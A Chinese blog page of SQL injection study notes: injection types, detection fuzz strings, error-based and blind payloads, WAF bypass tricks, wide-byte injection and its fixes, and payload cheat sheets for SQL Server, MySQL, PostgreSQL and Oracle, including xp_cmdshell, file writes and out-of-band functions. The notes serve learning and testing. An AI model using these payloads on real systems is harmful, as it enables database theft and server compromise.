



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Khala" href="https://mobius-0.github.io/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Khala" href="https://mobius-0.github.io/atom.xml" />
<link rel="alternate" type="application/json" title="Khala" href="https://mobius-0.github.io/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="网络安全,漏洞,SQL注入" />


<link rel="canonical" href="https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/">



  <title>
SQL注入 - 常见漏洞攻防 - WEB安全学习笔记 - 安全 |
FAF MAVE = Khala = 若要想看见妖精，就要有妖精的眼</title>
<meta name="generator" content="Hexo 6.3.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">SQL注入
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2022-11-26 11:05:09">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2022-11-26T11:05:09+08:00">2022-11-26</time>
  </span>
  <span class="item" title="本文字数">
    <span class="icon">
      <i class="ic i-pen"></i>
    </span>
    <span class="text">本文字数</span>
    <span>9.5k</span>
    <span class="text">字</span>
  </span>
  <span class="item" title="阅读时长">
    <span class="icon">
      <i class="ic i-clock"></i>
    </span>
    <span class="text">阅读时长</span>
    <span>11 分钟</span>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">FAF MAVE</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/24/y1zCgk3mNY5JEUr.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/18/e3McBIsWlNF8dHb.jpg"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/AdwtiUynu5Jjcmq.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/29/YUIx6gkPJtBlaLm.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/13/AxdIBGQtLV3iM2p.png"></li>
          <li class="item" data-background-image="https://s2.loli.net/2022/11/24/Vpbd7lLA8BX6kiq.png"></li>
        </ul>
      </div>
    
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    </header>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/security/" itemprop="item" rel="index" title="分类于 安全"><span itemprop="name">安全</span></a>
<meta itemprop="position" content="1" /></span>
<i class="ic i-angle-right"></i>
<span  itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/security/WebNote/" itemprop="item" rel="index" title="分类于 WEB安全学习笔记"><span itemprop="name">WEB安全学习笔记</span></a>
<meta itemprop="position" content="2" /></span>
<i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/security/WebNote/Vulnerability-Attack-and-defense/" itemprop="item" rel="index" title="分类于 常见漏洞攻防"><span itemprop="name">常见漏洞攻防</span></a>
<meta itemprop="position" content="3" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/SQL/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="晓楼">
    <meta itemprop="description" content="若要想看见妖精，就要有妖精的眼, GLHF">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Khala">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="注入分类"><a class="anchor" href="#注入分类">#</a> 注入分类</h1>
<h2 id="简介"><a class="anchor" href="#简介">#</a> 简介</h2>
<p>SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。 在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</p>
<h2 id="按技巧分类"><a class="anchor" href="#按技巧分类">#</a> 按技巧分类</h2>
<p>根据使用的技巧，SQL 注入类型可分为</p>
<ul>
<li>
<p>盲注</p>
<ul>
<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>
<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>
</ul>
</li>
<li>
<p>报错注入：应用会显示全部或者部分的报错信息</p>
</li>
<li>
<p>堆叠注入：有的应用可以加入  <code>;</code>  后一次执行多条语句</p>
</li>
<li>
<p>其他</p>
</li>
</ul>
<h2 id="按获取数据的方式分类"><a class="anchor" href="#按获取数据的方式分类">#</a> 按获取数据的方式分类</h2>
<p>另外也可以根据获取数据的方式分为 3 类</p>
<h3 id="inband"><a class="anchor" href="#inband">#</a> inband</h3>
<p>利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</p>
<h3 id="inference"><a class="anchor" href="#inference">#</a> inference</h3>
<p>通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注， 通过 web 应用的其他改变来推断数据。</p>
<h3 id="out-of-band-oob"><a class="anchor" href="#out-of-band-oob">#</a> out of band (OOB)</h3>
<p>通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。</p>
<h1 id="注入检测"><a class="anchor" href="#注入检测">#</a> 注入检测</h1>
<h2 id="常见的注入点"><a class="anchor" href="#常见的注入点">#</a> 常见的注入点</h2>
<ul>
<li>GET/POST/PUT/DELETE 参数</li>
<li>X-Forwarded-For</li>
<li>文件名</li>
</ul>
<h2 id="fuzz注入点"><a class="anchor" href="#fuzz注入点">#</a> Fuzz 注入点</h2>
<ul>
<li><code>'</code>  /  <code>&quot;</code></li>
<li><code>1/1</code></li>
<li><code>1/0</code></li>
<li><code>and 1=1</code></li>
<li><code>&quot; and &quot;1&quot;=&quot;1</code></li>
<li><code>and 1=2</code></li>
<li><code>or 1=1</code></li>
<li><code>or 1=</code></li>
<li><code>' and '1'='1</code></li>
<li><code>+</code>   <code>-</code>   <code>^</code>   <code>*</code>   <code>%</code>   <code>/</code></li>
<li><code>&lt;&lt;</code>   <code>&gt;&gt;</code>   <code>||</code>   <code>|</code>   <code>&amp;</code>   <code>&amp;&amp;</code></li>
<li><code>~</code></li>
<li><code>!</code></li>
<li><code>@</code></li>
<li>反引号执行</li>
</ul>
<h2 id="测试用常量"><a class="anchor" href="#测试用常量">#</a> 测试用常量</h2>
<ul>
<li><code>@@version</code></li>
<li><code>@@servername</code></li>
<li><code>@@language</code></li>
<li><code>@@spid</code></li>
</ul>
<h2 id="测试列数"><a class="anchor" href="#测试列数">#</a> 测试列数</h2>
<p>例如  <code>http://www.foo.com/index.asp?id=12+union+select+null,null--</code>  ，不断增加  <code>null</code>  至不返回</p>
<h2 id="报错注入"><a class="anchor" href="#报错注入">#</a> 报错注入</h2>
<ul>
<li><code>select 1/0</code></li>
<li><code>select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a</code></li>
<li><code>extractvalue(1, concat(0x5c,(select user())))</code></li>
<li><code>updatexml(0x3a,concat(1,(select user())),1)</code></li>
<li><code>exp(~(SELECT * from(select user())a))</code></li>
<li><code>ST_LatFromGeoHash((select * from(select * from(select user())a)b))</code></li>
<li><code>GTID_SUBSET(version(), 1)</code></li>
</ul>
<h3 id="基于geometric的报错注入"><a class="anchor" href="#基于geometric的报错注入">#</a> 基于 geometric 的报错注入</h3>
<ul>
<li><code>GeometryCollection((select * from (select * from(select user())a)b))</code></li>
<li><code>polygon((select * from(select * from(select user())a)b))</code></li>
<li><code>multipoint((select * from(select * from(select user())a)b))</code></li>
<li><code>multilinestring((select * from(select * from(select user())a)b))</code></li>
<li><code>LINESTRING((select * from(select * from(select user())a)b))</code></li>
<li><code>multipolygon((select * from(select * from(select user())a)b))</code></li>
</ul>
<p>其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvOTU4MjVmYTI4YTdlODRhMmY1ZGJkZWY1MjQxMDc4ZjcwNTVjNWIwNA==">commit 95825f</span> 。</p>
<p>而以上列表中基于 geometric 的报错注入在这个 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL215c3FsL215c3FsLXNlcnZlci9jb21taXQvNWNhZWE0YTk5NTEzMGNkN2M4MjU3NGFjYzU5MWZmN2M0NmQ5ZDk3OA==">commit 5caea4</span> 中被修复，在 5.5.x 较后的版本中同样不再生效。</p>
<h2 id="堆叠注入"><a class="anchor" href="#堆叠注入">#</a> 堆叠注入</h2>
<ul>
<li><code>;select 1</code></li>
</ul>
<h2 id="注释符"><a class="anchor" href="#注释符">#</a> 注释符</h2>
<ul>
<li><code>#</code></li>
<li><code>--+</code></li>
<li><code>/*xxx*/</code></li>
<li><code>/*!xxx*/</code></li>
<li><code>/*!50000xxx*/</code></li>
</ul>
<h2 id="判断过滤规则"><a class="anchor" href="#判断过滤规则">#</a> 判断过滤规则</h2>
<ul>
<li>是否有 trunc</li>
<li>是否过滤某个字符</li>
<li>是否过滤关键字</li>
<li>slash 和编码</li>
</ul>
<h2 id="获取信息"><a class="anchor" href="#获取信息">#</a> 获取信息</h2>
<ul>
<li>
<p>判断数据库类型</p>
<ul>
<li><code>and exists (select * from msysobjects ) &gt; 0</code>  access 数据库</li>
<li><code>and exists (select * from sysobjects ) &gt; 0</code>  SQLServer 数据库</li>
</ul>
</li>
<li>
<p>判断数据库表</p>
<ul>
<li><code>and exsits (select * from admin)</code></li>
</ul>
</li>
<li>
<p>版本、主机名、用户名、库名</p>
</li>
<li>
<p>表和字段</p>
<ul>
<li>
<p>确定字段数</p>
<ul>
<li>
<p>Order By</p>
</li>
<li>
<p>Select Into</p>
</li>
</ul>
</li>
<li>
<p>表名、列名</p>
</li>
</ul>
</li>
</ul>
<h2 id="测试权限"><a class="anchor" href="#测试权限">#</a> 测试权限</h2>
<ul>
<li>文件操作
<ul>
<li>读敏感文件</li>
<li>写 shell</li>
</ul>
</li>
<li>带外通道
<ul>
<li>网络请求</li>
</ul>
</li>
</ul>
<h1 id="权限提升"><a class="anchor" href="#权限提升">#</a> 权限提升</h1>
<h2 id="udf提权"><a class="anchor" href="#udf提权">#</a> UDF 提权</h2>
<p>UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为 MySQL 添加新函数，扩充其功能。</p>
<p>当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。</p>
<h1 id="数据库检测"><a class="anchor" href="#数据库检测">#</a> 数据库检测</h1>
<h2 id="mysql"><a class="anchor" href="#mysql">#</a> MySQL</h2>
<ul>
<li>sleep  <code>sleep(1)</code></li>
<li>benchmark  <code>BENCHMARK(5000000, MD5('test'))</code></li>
<li>字符串连接
<ul>
<li><code>SELECT 'a' 'b'</code></li>
<li><code>SELECT CONCAT('some','string')</code></li>
</ul>
</li>
<li>version
<ul>
<li><code>SELECT @@version</code></li>
<li><code>SELECT version()</code></li>
</ul>
</li>
<li>识别用函数
<ul>
<li><code>connection_id()</code></li>
<li><code>last_insert_id()</code></li>
<li><code>row_count()</code></li>
</ul>
</li>
</ul>
<h2 id="oracle"><a class="anchor" href="#oracle">#</a> Oracle</h2>
<ul>
<li>字符串连接
<ul>
<li><code>'a'||'oracle' --</code></li>
<li><code>SELECT CONCAT('some','string')</code></li>
</ul>
</li>
<li>version
<ul>
<li><code>SELECT banner FROM v$version</code></li>
<li><code>SELECT banner FROM v$version WHERE rownum=1</code></li>
</ul>
</li>
</ul>
<h2 id="sqlserver"><a class="anchor" href="#sqlserver">#</a> SQLServer</h2>
<ul>
<li>WAITFOR  <code>WAITFOR DELAY '00:00:10';</code></li>
<li>SERVERNAME  <code>SELECT @@SERVERNAME</code></li>
<li>version  <code>SELECT @@version</code></li>
<li>字符串连接
<ul>
<li><code>SELECT 'some'+'string'</code></li>
</ul>
</li>
<li>常量
<ul>
<li><code>@@pack_received</code></li>
<li><code>@@rowcount</code></li>
</ul>
</li>
</ul>
<h2 id="postgresql"><a class="anchor" href="#postgresql">#</a> PostgreSQL</h2>
<ul>
<li>sleep  <code>pg_sleep(1)</code></li>
</ul>
<h1 id="绕过技巧"><a class="anchor" href="#绕过技巧">#</a> 绕过技巧</h1>
<ul>
<li>
<p>编码绕过</p>
<ul>
<li>大小写</li>
<li>url 编码</li>
<li>html 编码</li>
<li>十六进制编码</li>
<li>unicode 编码</li>
</ul>
</li>
<li>
<p>注释</p>
<ul>
<li><code>//</code>   <code>--</code>   <code>-- +</code>   <code>-- -</code>   <code>#</code>   <code>/**/</code>   <code>;%00</code></li>
<li>内联注释用的更多，它有一个特性  <code>/!**/</code>  只有 MySQL 能识别</li>
<li>e.g.  <code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code></li>
</ul>
</li>
<li>
<p>只过滤了一次时</p>
<ul>
<li><code>union</code>  =&gt;  <code>ununionion</code></li>
</ul>
</li>
<li>
<p>相同功能替换</p>
<ul>
<li>函数替换
<ul>
<li><code>substring</code>  /  <code>mid</code>  /  <code>sub</code></li>
<li><code>ascii</code>  /  <code>hex</code>  /  <code>bin</code></li>
<li><code>benchmark</code>  /  <code>sleep</code></li>
</ul>
</li>
<li>变量替换
<ul>
<li><code>user()</code>  /  <code>@@user</code></li>
</ul>
</li>
<li>符号和关键字
<ul>
<li><code>and</code>  / `&amp;``</li>
<li><code>or</code>  /  <code>|</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>HTTP 参数</p>
<ul>
<li>HTTP 参数污染
<ul>
<li><code>id=1&amp;id=2&amp;id=3</code>  根据容器不同会有不同的结果</li>
</ul>
</li>
<li>HTTP 分割注入</li>
</ul>
</li>
<li>
<p>缓冲区溢出</p>
<ul>
<li>一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理</li>
</ul>
</li>
<li>
<p>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</p>
</li>
</ul>
<h1 id="sql注入小技巧"><a class="anchor" href="#sql注入小技巧">#</a> SQL 注入小技巧</h1>
<h2 id="宽字节注入"><a class="anchor" href="#宽字节注入">#</a> 宽字节注入</h2>
<p>一般程序员用 gbk 编码做开发的时候，会用  <code>set names 'gbk'</code>  来设定，这句话等同于</p>
<pre><code>set
character_set_connection = 'gbk',
character_set_result = 'gbk',
character_set_client = 'gbk';
</code></pre>
<p>漏洞发生的原因是执行了  <code>set character_set_client = 'gbk';</code>  之后，mysql 就会认为客户端传过来的数据是 gbk 编码的，从而使用 gbk 去解码，而 mysql_real_escape 是在解码前执行的。但是直接用  <code>set names 'gbk'</code>  的话 real_escape 是不知道设置的数据的编码的，就会加  <code>%5c</code>  。此时 server 拿到数据解码 就认为提交的字符 +%5c 是 gbk 的一个字符，这样就产生漏洞了。</p>
<p>解决的办法有三种，第一种是把 client 的 charset 设置为 binary，就不会做一次解码的操作。第二种是是  <code>mysql_set_charset('gbk')</code>  ，这里就会把编码的信息保存在和数据库的连接里面，就不会出现这个问题了。 第三种就是用 pdo。</p>
<p>还有一些其他的编码技巧，比如 latin 会弃掉无效的 unicode，那么 admin%32 在代码里面不等于 admin，在数据库比较会等于 admin。</p>
<h1 id="cheatsheet"><a class="anchor" href="#cheatsheet">#</a> CheatSheet</h1>
<h2 id="sql-server-payload"><a class="anchor" href="#sql-server-payload">#</a> SQL Server Payload</h2>
<h3 id="常见payload"><a class="anchor" href="#常见payload">#</a> 常见 Payload</h3>
<ul>
<li>
<p>Version</p>
<ul>
<li><code>SELECT @@version</code></li>
<li><code>SELECT SERVERPROPERTY('Edition');</code></li>
<li><code>SELECT SERVERPROPERTY('EngineEdition');</code></li>
</ul>
</li>
<li>
<p>Comment</p>
<ul>
<li><code>SELECT 1 -- comment</code></li>
<li><code>SELECT /*comment*/1</code></li>
</ul>
</li>
<li>
<p>Space</p>
<ul>
<li><code>0x01 - 0x20</code></li>
</ul>
</li>
<li>
<p>用户信息</p>
<ul>
<li><code>SELECT user_name()</code></li>
<li>``SELECT system_user`</li>
<li><code>SELECT user</code></li>
<li><code>SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</code></li>
</ul>
</li>
<li>
<p>用户权限</p>
<ul>
<li><code>select IS_SRVROLEMEMBER('sysadmin')</code></li>
<li><code>select IS_SRVROLEMEMBER('db_owner')</code></li>
</ul>
</li>
<li>
<p>List User</p>
<p><code>SELECT name FROM master..syslogins</code></p>
</li>
<li>
<p>数据库信息</p>
<ul>
<li><code>SELECT name FROM master..sysdatabases</code></li>
<li><code>select concat_ws(table_schema,table_name,column_name) from information_schema.columns</code></li>
<li><code>select quotename(name) from master..sysdatabases FOR XML PATH('')</code></li>
</ul>
</li>
<li>
<p>执行命令</p>
<ul>
<li><code>EXEC xp_cmdshell 'net user'</code></li>
</ul>
</li>
<li>
<p>Ascii</p>
<ul>
<li><code>SELECT char(0x41)</code></li>
<li><code>SELECT ascii('A')</code></li>
<li><code>SELECT char(65)+char(66)</code>  =&gt; return  <code>AB</code></li>
</ul>
</li>
<li>
<p>Delay</p>
<ul>
<li><code>WAITFOR DELAY '0:0:3'</code>  pause for 3 seconds</li>
</ul>
</li>
<li>
<p>Change Password</p>
<ul>
<li><code>ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'</code></li>
</ul>
</li>
<li>
<p>Trick</p>
<ul>
<li><code>id=1 union:select password from:user</code></li>
</ul>
</li>
<li>
<p>文件读取</p>
<ul>
<li>OpenRowset</li>
</ul>
</li>
<li>
<p>当前查询语句</p>
<ul>
<li><code>select text from sys.dm_exec_requests cross apply sys.dm_exec_sql_text(sql_handle)</code></li>
</ul>
</li>
<li>
<p>hostname</p>
<ul>
<li>用于判断是否站库分离</li>
<li><code>select host_name()</code></li>
<li><code>exec xp_getnetname</code></li>
</ul>
</li>
<li>
<p>服务器信息</p>
<ul>
<li><code>exec xp_msver</code></li>
</ul>
</li>
<li>
<p>系统配置</p>
<ul>
<li><code>select * from sys.configurations;</code></li>
</ul>
</li>
</ul>
<h3 id="注册表读写"><a class="anchor" href="#注册表读写">#</a> 注册表读写</h3>
<ul>
<li>
<p><code>xp_regread</code></p>
<ul>
<li><code>exec xp_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSEARCH'</code></li>
</ul>
</li>
<li>
<p><code>xp_regwrite</code></p>
</li>
<li>
<p><code>xp_regdeletvalue</code></p>
</li>
<li>
<p><code>xp_regdeletkey</code></p>
</li>
<li>
<p><code>xp_regaddmultistring</code></p>
</li>
</ul>
<h3 id="报错注入-2"><a class="anchor" href="#报错注入-2">#</a> 报错注入</h3>
<ul>
<li><code>1=convert(int,(db_name()))</code></li>
</ul>
<h3 id="常用函数"><a class="anchor" href="#常用函数">#</a> 常用函数</h3>
<ul>
<li>SUSER_NAME()</li>
<li>USER_NAME()</li>
<li>PERMISSIONS()</li>
<li>DB_NAME()</li>
<li>FILE_NAME()</li>
<li>TYPE_NAME()</li>
<li>COL_NAME()</li>
</ul>
<h3 id="dns-oob"><a class="anchor" href="#dns-oob">#</a> DNS OOB</h3>
<ul>
<li>fn_xe_file_target_read_file</li>
<li>fn_get_audit_file</li>
<li>fn_trace_gettable</li>
</ul>
<h3 id="其他常用存储过程"><a class="anchor" href="#其他常用存储过程">#</a> 其他常用存储过程</h3>
<ul>
<li>sp_execute_external_script</li>
<li>sp_makewebtask</li>
<li>sp_OACreate</li>
<li>sp_OADestroy</li>
<li>sp_OAGetErrorInfo</li>
<li>sp_OAGetProperty</li>
<li>sp_OAMethod</li>
<li>sp_OASetProperty</li>
<li>sp_OAStop</li>
<li>xp_cmdshell</li>
<li>xp_dirtree</li>
<li>xp_enumerrorlogs</li>
<li>xp_enumgroups</li>
<li>xp_fixeddrives</li>
<li>xp_getfiledetails</li>
<li>xp_loginconfig</li>
</ul>
<h2 id="mysql-payload"><a class="anchor" href="#mysql-payload">#</a> MySQL Payload</h2>
<h3 id="常见payload-2"><a class="anchor" href="#常见payload-2">#</a> 常见 Payload</h3>
<ul>
<li>
<p>Version</p>
<ul>
<li><code>SELECT @@version</code></li>
</ul>
</li>
<li>
<p>Comment</p>
<ul>
<li><code>SELECT 1 -- comment</code></li>
<li><code>SELECT 1 # comment</code></li>
<li><code>SELECT /*comment*/1</code></li>
</ul>
</li>
<li>
<p>Space</p>
<ul>
<li><code>0x9</code>   <code>0xa-0xd</code>   <code>0x20</code>   <code>0xa0</code></li>
</ul>
</li>
<li>
<p>Current User</p>
<ul>
<li><code>SELECT user()</code></li>
<li><code>SELECT system_user()</code></li>
<li><code>SELECT current_role()</code></li>
</ul>
</li>
<li>
<p>List User</p>
<ul>
<li><code>SELECT user FROM mysql.user</code></li>
</ul>
</li>
<li>
<p>Current Database</p>
<ul>
<li><code>SELECT database()</code></li>
</ul>
</li>
<li>
<p>List Database</p>
<ul>
<li><code>SELECT schema_name FROM information_schema.schemata</code></li>
</ul>
</li>
<li>
<p>List Tables</p>
<ul>
<li><code>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>
</ul>
</li>
<li>
<p>List Columns</p>
<ul>
<li><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'</code></li>
</ul>
</li>
<li>
<p>If</p>
<ul>
<li><code>SELECT if(1=1,'foo','bar');</code>  return 'foo'</li>
</ul>
</li>
<li>
<p>Ascii</p>
<ul>
<li>`SELECT char(0x41)</li>
<li><code>SELECT ascii('A')</code></li>
<li><code>SELECT 0x414243</code>  =&gt; return  <code>ABC</code></li>
</ul>
</li>
<li>
<p>Delay</p>
<ul>
<li><code>sleep(1)</code></li>
<li><code>SELECT BENCHMARK(1000000,MD5('A'))</code></li>
</ul>
</li>
<li>
<p>Read File</p>
<ul>
<li><code>select @@datadir``select load_file('databasename/tablename.MYD')</code></li>
</ul>
</li>
<li>
<p>Blind</p>
<ul>
<li><code>ascii(substring(str,pos,length)) &amp; 32 = 1</code></li>
</ul>
</li>
<li>
<p>Error Based</p>
<ul>
<li><code>select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;</code></li>
<li><code>select count(*) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)*2))</code></li>
</ul>
</li>
<li>
<p>Change Password</p>
<ul>
<li><code>mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;&quot;</code></li>
</ul>
</li>
</ul>
<h4 id="报错注入常见函数"><a class="anchor" href="#报错注入常见函数">#</a> 报错注入常见函数</h4>
<ul>
<li>extractvalue</li>
<li>updatexml</li>
<li>GeometryCollection</li>
<li>linestring</li>
<li>multilinestring</li>
<li>multipoint</li>
<li>multipolygon</li>
<li>polygon</li>
<li>exp</li>
</ul>
<h3 id="写文件"><a class="anchor" href="#写文件">#</a> 写文件</h3>
<h4 id="写文件前提"><a class="anchor" href="#写文件前提">#</a> 写文件前提</h4>
<ul>
<li>root 权限</li>
<li>知晓文件绝对路径</li>
<li>写入的路径存在写入权限</li>
<li>secure_file_priv 允许向对应位置写入</li>
<li><code>select count(file_priv) from mysql.user</code></li>
</ul>
<h4 id="基于into写文件"><a class="anchor" href="#基于into写文件">#</a> 基于 into 写文件</h4>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/tmp/demo.txt'</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> <span class="token string">'/tmp/demo.txt'</span></pre></td></tr></table></figure><p>dumpfile 和 outfile 不同在于，outfile 会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏</p>
<h4 id="基于log写文件"><a class="anchor" href="#基于log写文件">#</a> 基于 log 写文件</h4>
<pre><code>show variables like '%general%';
set global general_log = on;
set global general_log_file = '/path/to/file';
select '&lt;?php var_dump(&quot;test&quot;);?&gt;';
set global general_log_file = '/original/path';
set global general_log = off;
</code></pre>
<h2 id="postgressql-payload"><a class="anchor" href="#postgressql-payload">#</a> PostgresSQL Payload</h2>
<ul>
<li>Version
<ul>
<li><code>SELECT version()</code></li>
</ul>
</li>
<li>Comment
<ul>
<li><code>SELECT 1 -- comment``SELECT /*comment*/1</code></li>
</ul>
</li>
<li>Current User
<ul>
<li><code>SELECT user</code></li>
<li><code>SELECT current_user</code></li>
<li>``SELECT session_user`</li>
<li><code>SELECT getpgusername()</code></li>
</ul>
</li>
<li>List User
<ul>
<li><code>SELECT usename FROM pg_user</code></li>
</ul>
</li>
<li>Current Database
<ul>
<li><code>SELECT current_database()</code></li>
</ul>
</li>
<li>List Database
<ul>
<li><code>SELECT datname FROM pg_database</code></li>
</ul>
</li>
<li>Ascii
<ul>
<li><code>SELECT char(0x41)</code></li>
<li><code>SELECT ascii('A')</code></li>
</ul>
</li>
<li>Delay
<ul>
<li><code>pg_sleep(1)</code></li>
</ul>
</li>
</ul>
<h2 id="oracle-payload"><a class="anchor" href="#oracle-payload">#</a> Oracle Payload</h2>
<h3 id="常见payload-3"><a class="anchor" href="#常见payload-3">#</a> 常见 Payload</h3>
<ul>
<li>
<ul>
<li>
<p>dump</p>
<p><code>select * from v$tablespace;``select * from user_tables;``select column_name from user_tab_columns where table_name = 'table_name';``select column_name, data_type from user_tab_columns where table_name = 'table_name';``SELECT * FROM ALL_TABLES</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>Comment</p>
<p><code>--``/**/</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>Space</p>
<p><code>0x00</code>   <code>0x09</code>   <code>0xa-0xd</code>   <code>0x20</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>报错</p>
<p><code>utl_inaddr.get_host_name``ctxsys.drithsx.sn``ctxsys.CTX_REPORT.TOKEN_TYPE``XMLType``dbms_xdb_version.checkin``dbms_xdb_version.makeversioned``dbms_xdb_version.uncheckout``dbms_utility.sqlid_to_sqlhash``ordsys.ord_dicom.getmappingxpath``utl_inaddr.get_host_name``utl_inaddr.get_host_address</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>OOB</p>
<p><code>utl_http.request``utl_inaddr.get_host_address``SYS.DBMS_LDAP.INIT``HTTPURITYPE``HTTP_URITYPE.GETCLOB</code></p>
</li>
</ul>
</li>
<li>
<ul>
<li>
<p>绕过</p>
<p><code>rawtohex</code></p>
</li>
</ul>
</li>
</ul>
<h3 id="写文件-2"><a class="anchor" href="#写文件-2">#</a> 写文件</h3>
